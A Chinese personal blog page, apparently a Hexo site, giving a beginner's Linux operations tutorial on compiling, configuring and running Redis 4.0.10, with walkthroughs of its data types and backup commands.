@@ -1,0 +1,983 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="liaoyue">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Redis1.编译安装&amp;emsp;&amp;emsp;首先下载源码并解压： 123wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.10.tar.gztar -xzf redis-4.0.10.tar.gzcd redis-4.0.10     &amp;emsp;&amp;emsp;解压后进行相关软件包的安装 12yum -y install gcc gcc-c++ ke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis">
+<meta property="og:url" content="https://one-null-pointer.github.io/2023/06/05/Linux%E8%BF%90%E7%BB%B4%E2%80%94%E2%80%94Redis/index.html">
+<meta property="og:site_name" content="one-null-poniter">
+<meta property="og:description" content="Redis1.编译安装&amp;emsp;&amp;emsp;首先下载源码并解压： 123wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.10.tar.gztar -xzf redis-4.0.10.tar.gzcd redis-4.0.10     &amp;emsp;&amp;emsp;解压后进行相关软件包的安装 12yum -y install gcc gcc-c++ ke">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://one-null-pointer.github.io/img/Linux.png">
+<meta property="article:published_time" content="2023-06-05T08:21:48.000Z">
+<meta property="article:modified_time" content="2023-08-13T09:55:22.412Z">
+<meta property="article:author" content="liaoyue">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://one-null-pointer.github.io/img/Linux.png">
+  
+  
+  
+  <title>Redis - one-null-poniter</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"one-null-pointer.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>one null pointer</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                吾
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                學
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                類
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Redis"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-05 16:21" pubdate>
+          June 5, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          81 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Redis</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h4 id="1-编译安装"><a href="#1-编译安装" class="headerlink" title="1.编译安装"></a>1.编译安装</h4><p>&emsp;&emsp;首先下载源码并解压：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xzf redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/1.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;解压后进行相关软件包的安装</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">yum</span> <span class="hljs-literal">-</span><span class="hljs-comment">y install gcc gcc</span><span class="hljs-literal">-</span><span class="hljs-comment">c</span><span class="hljs-literal">++</span> <span class="hljs-comment">kernel</span><span class="hljs-literal">-</span><span class="hljs-comment">devel</span><br><span class="hljs-comment">make</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/2.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;进行make安装</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">make PREFIX=<span class="hljs-regexp">/usr/</span>local/redis install<br>mkdir <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>etc/<br>cp redis.conf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>etc/<br>cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>bin/<br>cp redis-benchmark redis-cli redis-server <span class="hljs-regexp">/usr/</span>bin/<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/3.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;修改相关配置：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>etc/redis.conf<br><span class="hljs-comment"># 修改一下配置</span><br><span class="hljs-comment"># redis以守护进程的方式运行</span><br><span class="hljs-comment"># no表示不以守护进程的方式运行(会占用一个终端)  </span><br>daemonize yes<br><span class="hljs-comment"># 客户端闲置多长时间后断开连接，默认为0关闭此功能                      timeout 300</span><br><span class="hljs-comment"># 设置redis日志级别，默认级别：notice                    </span><br>loglevel verbose<br><span class="hljs-comment"># 设置日志文件的输出方式,如果以守护进程的方式运行redis 默认:&quot;&quot; </span><br><span class="hljs-comment"># 并且日志输出设置为stdout,那么日志信息就输出到/dev/null里面去了 logfile stdout</span><br><span class="hljs-comment"># 设置密码授权</span><br>requirepass &lt;<span class="hljs-number">43999</span>&gt;    <span class="hljs-comment">#这里的&lt;&gt;也是密码的一部分</span><br><span class="hljs-comment"># 监听ip</span><br>bind <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/4.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;配置环境变量：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>profile<br>export PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>bin<br><span class="hljs-comment"># 让环境变量立即生效</span><br>source <span class="hljs-regexp">/etc/</span>profile<br><span class="hljs-comment">#创建启动脚本</span><br>vim redis<br><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment">#chkconfig: 2345 80 90</span><br><span class="hljs-comment"># Simple Redis init.d script conceived to work on Linux systems</span><br><span class="hljs-comment"># as it does use of the /proc filesystem.</span><br><br>PATH=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin:/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:/bin<br>REDISPORT=<span class="hljs-number">6379</span><br>EXEC=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>bin/redis-server<br>REDIS_CLI=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>bin/redis-cli<br>   <br>PIDFILE=<span class="hljs-regexp">/var/</span>run/redis.pid<br>CONF=<span class="hljs-string">&quot;/usr/local/redis/etc/redis.conf&quot;</span><br>   <br>case <span class="hljs-string">&quot;$1&quot;</span> <span class="hljs-keyword">in</span><br>    start)<br>        <span class="hljs-keyword">if</span> [ -f <span class="hljs-variable">$PIDFILE</span> ]<br>        then<br>                echo <span class="hljs-string">&quot;$PIDFILE exists, process is already running or crashed&quot;</span><br>        <span class="hljs-keyword">else</span><br>                echo <span class="hljs-string">&quot;Starting Redis server...&quot;</span><br>                <span class="hljs-variable">$EXEC</span> <span class="hljs-variable">$CONF</span><br>        fi<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$?&quot;</span>=<span class="hljs-string">&quot;0&quot;</span> ] <br>        then<br>              echo <span class="hljs-string">&quot;Redis is running...&quot;</span><br>        fi<br>        ;;<br>    stop)<br>        <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$PIDFILE</span> ]<br>        then<br>                echo <span class="hljs-string">&quot;$PIDFILE does not exist, process is not running&quot;</span><br>        <span class="hljs-keyword">else</span><br>                PID=$(cat <span class="hljs-variable">$PIDFILE</span>)<br>                echo <span class="hljs-string">&quot;Stopping ...&quot;</span><br>                <span class="hljs-variable">$REDIS_CLI</span> -p <span class="hljs-variable">$REDISPORT</span> SHUTDOWN<br>                <span class="hljs-keyword">while</span> [ -x <span class="hljs-variable">$&#123;PIDFILE&#125;</span> ]<br>               <span class="hljs-keyword">do</span><br>                    echo <span class="hljs-string">&quot;Waiting for Redis to shutdown ...&quot;</span><br>                    sleep <span class="hljs-number">1</span><br>                done<br>                echo <span class="hljs-string">&quot;Redis stopped&quot;</span><br>        fi<br>        ;;<br>   restart|force-reload)<br>        <span class="hljs-variable">$&#123;0&#125;</span> stop<br>        <span class="hljs-variable">$&#123;0&#125;</span> start<br>        ;;<br>  *)<br>    echo <span class="hljs-string">&quot;Usage: /etc/init.d/redis &#123;start|stop|restart|force-reload&#125;&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br>        <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br>esac<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/5.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;接下来设置开机自启：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 复制脚本文件到init.d目录下</span><br>cp redis <span class="hljs-string">/etc/init.d/</span><br><span class="hljs-comment"># 给脚本增加运行权限</span><br>chmod +x <span class="hljs-string">/etc/init.d/redis</span><br><span class="hljs-comment"># 查看服务列表</span><br>chkconfig <span class="hljs-params">--list</span><br><span class="hljs-comment"># 添加服务</span><br>chkconfig <span class="hljs-params">--add</span> redis<br><span class="hljs-comment"># 配置启动级别</span><br>chkconfig <span class="hljs-params">--level</span> 2345 redis on<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/6.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;启动测试</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">systemctl <span class="hljs-built_in">start</span> redis    <br>systemctl <span class="hljs-built_in">stop</span> redis   <br><span class="hljs-comment"># 查看redis进程</span><br>ps -el|grep redis<br><span class="hljs-comment"># 端口查看</span><br>netstat -<span class="hljs-keyword">an</span>|grep <span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/7.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里比较特殊的就是在Redis的编译安装过程中，通常不会提供一个单独的config文件。这是因为Redis的配置信息通常是通过命令行参数或者在启动脚本中直接指定的</p>
+<p>&emsp;</p>
+<h4 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h4><p>&emsp;&emsp;Redis 的配置文件位于 Redis 安装目录下，文件名为 redis.conf，我们可以通过config命令查看或者是设置配置项：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">redis 127.0.0.1:6379&gt;<span class="hljs-built_in"> CONFIG </span><span class="hljs-built_in">GET</span> loglevel<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/8.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里需要注意的是在redis进行执行命令之前需要先进行身份验证，这是因为Redis默认情况下启用了身份验证机制，要求客户端在执行任何命令之前进行身份验证。如果你没有提供正确的身份验证信息，就会收到(error) NOAUTH Authentication required.的报错消息，这里有两种办法进行身份验证，一种是没进入redis前使用-a进行身份验证，或者进入后使用auth进行身份验证</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -a &lt;<span class="hljs-number">43999</span>&gt;<br><span class="hljs-attribute">auth</span> &lt;<span class="hljs-number">43999</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;处理指定某些配置以外，我们也能使用*号获取所有的配置项：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">CONFIG <span class="hljs-built_in">GET</span> *<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/9.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3.数据类型"></a>3.数据类型</h4><p>&emsp;&emsp;我们需要提到的是在redis内部会使用一个redisObject对象来表示所有的key和value，redisObject的主要信息包括了数据类型、编码方式、数据指针、虚拟内存已经其他信息等，而这其中的数据类型就是支持五种数据类型，分别是string（字符串）、hash（哈希），list（列表）、set（集合）以及zset（有序集合），</p>
+<ul>
+<li><h5 id="String（字符串）"><a href="#String（字符串）" class="headerlink" title="String（字符串）"></a>String（字符串）</h5></li>
+</ul>
+<p>&emsp;&emsp;字符串是redis的最基本类型，一个key对应了一个value，string类型是二进制安全，这意味着其可以存放任何数据，包括jpg图片或者序列化的对象，该类型的值最大的存储大小为512MB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> <span class="hljs-built_in">test</span> “<span class="hljs-built_in">test</span>”<br>get <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/10.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="Hash（哈希）"><a href="#Hash（哈希）" class="headerlink" title="Hash（哈希）"></a>Hash（哈希）</h5></li>
+</ul>
+<p>&emsp;&emsp;Redis hash 是一个键值(key=&gt;value)对集合。可以说是一个 string 类型的 field 和 value 的映射表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">del <span class="hljs-built_in">test</span><br>hmset <span class="hljs-built_in">test</span> field1 “test1” field2 “test2”<br>hget <span class="hljs-built_in">test</span> field1<br>hget <span class="hljs-built_in">test</span> field2<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/11.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里需要注意的是我们需要用del删除前面测试用过的key，否则会提示(error) WRONGTYPE Operation against a key holding the wrong kind of value，这错误意味着我们正在对一个键执行了与其存储的值类型不匹配的操作。</p>
+<p>&emsp;&emsp;案例中使用了 Redis HMSET, HGET 命令，HMSET 设置了两个 field=&gt;value 对, HGET 获取对应 field 对应的 value</p>
+<ul>
+<li><h5 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h5></li>
+</ul>
+<p>&emsp;&emsp;Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tcl">del test<br>lpush test redis<br>lpush test mysql<br>lpush test mongodb<br><span class="hljs-keyword">lrange</span> test <span class="hljs-number">0</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/12.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;前面展示的是从头部插入（左边），如果需要再尾部（右边）进行插入的话，就引用rpush即可</p>
+<center><img src="/img/Linux运维——Redis/13.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里需要提及的是lrange test 0 2这一个查询语句，0和2分别表示要获取的元素的起始索引和结束索引，索引从0开始，所以0表示第一个元素，1表示第二个元素，依此类推。如果你想获取所有元素，可以将结束索引设置为-1即可</p>
+<ul>
+<li><h5 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h5></li>
+</ul>
+<p>&emsp;&emsp;set数据类型就是string类型的无序版本，通过哈希表进行实现和添加，添加未存在的元素会反馈为1，如果元素已经存在集合中则会反馈为0</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">del <span class="hljs-built_in">test</span><br>sadd <span class="hljs-built_in">test</span> redis<br>sadd <span class="hljs-built_in">test</span> mongodb<br>sadd <span class="hljs-built_in">test</span> mysql<br>sadd <span class="hljs-built_in">test</span> redis<br>smembers <span class="hljs-built_in">test</span> <br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/14.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="Zset（有序集合）"><a href="#Zset（有序集合）" class="headerlink" title="Zset（有序集合）"></a>Zset（有序集合）</h5></li>
+</ul>
+<p>&emsp;&emsp;zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">del</span> test<br><span class="hljs-attribute">zadd</span> test <span class="hljs-number">0</span> redis<br><span class="hljs-attribute">zadd</span> test <span class="hljs-number">0</span> mongodb<br><span class="hljs-attribute">zadd</span> test <span class="hljs-number">0</span> mysql<br><span class="hljs-attribute">zadd</span> test <span class="hljs-number">0</span> redis<br><span class="hljs-attribute">zrangebyscore</span> test <span class="hljs-number">0</span> <span class="hljs-number">1000</span><br><span class="hljs-attribute">zadd</span> test <span class="hljs-number">2</span> sqlserver<br><span class="hljs-attribute">zrangebyscore</span> test <span class="hljs-number">0</span> <span class="hljs-number">1000</span><br><span class="hljs-attribute">zadd</span> test <span class="hljs-number">1</span> orcel<br><span class="hljs-attribute">zrangebyscore</span> test <span class="hljs-number">0</span> <span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/15.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;可以看到，在zset的有序集合中，数据是按照权重进行排序，小的靠前，达到靠后，在保留set的不重复的特性下，进行了排序功能的加入，接下来是学习redis的相关命令</p>
+<p>&emsp;</p>
+<h4 id="4-操作命令"><a href="#4-操作命令" class="headerlink" title="4.操作命令"></a>4.操作命令</h4><p>redis的命令是用于在redis服务上进行执行和操作，而这就需要一个redis的客户端与我们进行交互，这个客户端在我们之前下载的redis的安装包中就已经具备了</p>
+<p>首先是进入客户端的命令：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">redis-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure>
+
+<p>前面也有体现过了，这里就不进行展示了，当我们打开字段输入该命令的时候，该命令就会连接本地的redis服务，而 我们能够进入服务执行ping命令加测redis是否启动</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/16.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+
+
+<h4 id="5-数据备份与恢复"><a href="#5-数据备份与恢复" class="headerlink" title="5.数据备份与恢复"></a>5.数据备份与恢复</h4><p>&emsp;&emsp;与mysql数据库相同，redis也提供了数据库的备份功能，使用save用于创建数据库的备份，其语法为：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">SAVE</span><br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;是的，没看错，save一个单词就是其备份的语法，这个命令会在redis安装的目录中创建一个dump.rdb的文件</p>
+<center><img src="/img/Linux运维——Redis/17.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;很奇怪，资料查阅是指备份是在安装的目录中创建对应的文件，但是这里是直接在/中创建了该文件，这里如果需要恢复数据，只需将备份文件 (dump.rdb) 移动到 redis 安装目录并启动服务即可。获取 redis 目录可以使用 CONFIG 命令</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config get dir<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/18.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;与save同样具有保存功能的还有bgsave，他们的区别就在于save命令是阻塞主进程，save操作完成之后，主进程才开始工作，客户端可以连接；bgsave命令是fork一个专门save的子进程，此操作不会影响主进程</p>
